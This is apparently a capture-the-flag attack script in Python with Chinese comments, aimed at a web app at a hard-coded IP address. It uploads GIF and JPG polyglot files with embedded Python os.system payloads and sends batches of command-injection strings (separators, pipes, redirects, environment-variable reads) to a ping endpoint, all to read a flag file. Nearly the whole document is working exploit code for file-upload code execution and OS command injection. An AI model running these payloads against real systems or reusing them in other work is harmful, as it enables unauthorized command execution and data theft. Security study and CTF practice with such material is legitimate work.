import requests
import re

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})
session.proxies = {}


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def test_gif_image_data_payload():
    """测试在GIF图像数据区域注入Python代码"""
    print_section("1. 在GIF图像数据区域注入Python代码")
    
    url = f"{TARGET}/upload"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    # 创建一个有效的GIF文件，在图像数据区域包含Python代码
    # 格式：GIF89a + 宽度(1) + 高度(1) + 标志(0x80) + 背景色 + 像素比
    # + 全局颜色表(6字节：2种颜色 * 3字节)
    # + 图像控制块(!\xf9...)
    # + 图像开始(,) + 位置(0,0) + 尺寸(1,1) + 局部标志(0)
    # + 图像数据(0x02 + LZW编码数据)
    # + 图像数据结束(0x00)
    # + GIF结束(;)
    
    # 在图像数据区域添加Python代码
    # 图像数据区域格式: 块大小 + LZW数据 + 0x00
    
    python_payloads = [
        # 在图像数据块大小和数据之间插入
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02" + b"import os;os.system('type F:\\\\flag.txt')" + b"\x02\x4c\x01\x00;",
        # 在全局颜色表之后插入
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00" + b"import os;os.system('type F:\\\\flag.txt')" + b"!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;",
        # 在图像控制块之后插入
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00" + b"import os;os.system('type F:\\\\flag.txt')" + b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;",
        # 在图像开始标记之后插入
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00" + b"import os;os.system('type F:\\\\flag.txt')" + b"\x02\x02\x4c\x01\x00;",
        # 在块大小之后插入
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02" + b"import os;os.system('type F:\\\\flag.txt')" + b"\x4c\x01\x00;",
        # 使用Unicode编码
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00" + b"__import__('os').system('type F:\\\\flag.txt')" + b";",
        # 使用不同的命令格式
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00" + b"exec('import os;print(os.popen(\"type F:\\\\\\\\flag.txt\").read())')" + b";",
        # 使用十六进制编码
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00" + b"python -c \"import os;os.system('type F:\\\\\\\\flag.txt')\"" + b";",
    ]
    
    for i, payload in enumerate(python_payloads):
        filename = f"gif_payload_{i}.gif"
        try:
            files = {"file": (filename, payload, "image/gif")}
            r = session.post(url, files=files, data={"csrf": csrf_token}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                if "上传成功" in r.text:
                    uploaded_name = re.search(r'/uploads/([^"]+)', r.text)
                    if uploaded_name:
                        print(f"\n  🎉 上传成功: {filename} -> /uploads/{uploaded_name.group(1)}")
                        
                        r2 = session.get(f"{TARGET}/uploads/{uploaded_name.group(1)}", timeout=TIMEOUT)
                        print(f"     Content-Type: {r2.headers.get('Content-Type', '')}")
                        print(f"     内容: {r2.text[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
                        if flag_match:
                            print(f"     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                else:
                    notice = re.search(r'<p class="notice">(.*?)</p>', r.text)
                    if notice:
                        print(f"\n  ❌ {filename}: {notice.group(1)}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_jpg_image_data_payload():
    """测试在JPG图像数据区域注入Python代码"""
    print_section("2. 在JPG图像数据区域注入Python代码")
    
    url = f"{TARGET}/upload"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    # JPG格式：SOI(FFD8) + APP0 + JFIF + 其他段 + EOI(FFD9)
    # 可以在APP0段之后插入内容
    
    jpg_base = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0a\x0a\x09\x08\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b\x0e\x0b\x09\x09"
    jpg_end = b"\xff\xd9"
    
    python_payloads = [
        # 在JPG头部之后插入
        jpg_base + b"import os;os.system('type F:\\\\flag.txt')" + jpg_end,
        # 在JPG数据区域插入
        b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" + b"import os;os.system('type F:\\\\flag.txt')" + b"\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0a\x0a\x09\x08\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b\x0e\x0b\x09\x09\xff\xd9",
        # 使用不同的命令格式
        jpg_base + b"__import__('os').system('type F:\\\\flag.txt')" + jpg_end,
        jpg_base + b"exec('import os;print(os.popen(\"type F:\\\\\\\\flag.txt\").read())')" + jpg_end,
    ]
    
    for i, payload in enumerate(python_payloads):
        filename = f"jpg_payload_{i}.jpg"
        try:
            files = {"file": (filename, payload, "image/jpeg")}
            r = session.post(url, files=files, data={"csrf": csrf_token}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                if "上传成功" in r.text:
                    uploaded_name = re.search(r'/uploads/([^"]+)', r.text)
                    if uploaded_name:
                        print(f"\n  🎉 上传成功: {filename} -> /uploads/{uploaded_name.group(1)}")
                        
                        r2 = session.get(f"{TARGET}/uploads/{uploaded_name.group(1)}", timeout=TIMEOUT)
                        print(f"     Content-Type: {r2.headers.get('Content-Type', '')}")
                        print(f"     内容: {r2.text[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
                        if flag_match:
                            print(f"     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                else:
                    notice = re.search(r'<p class="notice">(.*?)</p>', r.text)
                    if notice:
                        print(f"\n  ❌ {filename}: {notice.group(1)}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_ping_special_chars():
    """测试Ping命令执行（特殊字符）"""
    print_section("3. 测试Ping命令执行（特殊字符）")
    
    ping_url = f"{TARGET}/ping"
    
    # 尝试各种特殊字符
    ping_payloads = [
        # 使用括号
        "(127.0.0.1)",
        "(127.0.0.1);type F:\\flag.txt",
        "127.0.0.1;(type F:\\flag.txt)",
        # 使用引号
        "\"127.0.0.1\";type F:\\flag.txt",
        "'127.0.0.1';type F:\\flag.txt",
        # 使用转义字符
        "127.0.0.1\\;type F:\\flag.txt",
        "127.0.0.1\\n;type F:\\flag.txt",
        # 使用变量
        "127.0.0.1;%cd%",
        "127.0.0.1;%path%",
        "127.0.0.1;%temp%",
        # 使用环境变量
        "127.0.0.1;echo %userdomain%",
        "127.0.0.1;echo %username%",
        "127.0.0.1;echo %computername%",
        # 使用命令扩展
        "127.0.0.1;for %i in (1,2,3) do echo %i",
        "127.0.0.1;if exist F:\\flag.txt echo found",
        # 使用管道
        "127.0.0.1|findstr /i flag",
        "127.0.0.1|more",
        # 使用重定向
        "127.0.0.1>flag.txt",
        "127.0.0.1>>flag.txt",
    ]
    
    for payload in ping_payloads:
        try:
            r = session.get(ping_url, params={"host": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if len(body_content) > 100:
                        print(f"\n  [{r.status_code}] ?host={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            pass


def main():
    print("*" * 70)
    print("  CTF漏洞深度测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    test_gif_image_data_payload()
    test_jpg_image_data_payload()
    test_ping_special_chars()
    
    print_section("测试完成")


if __name__ == "__main__":
    main()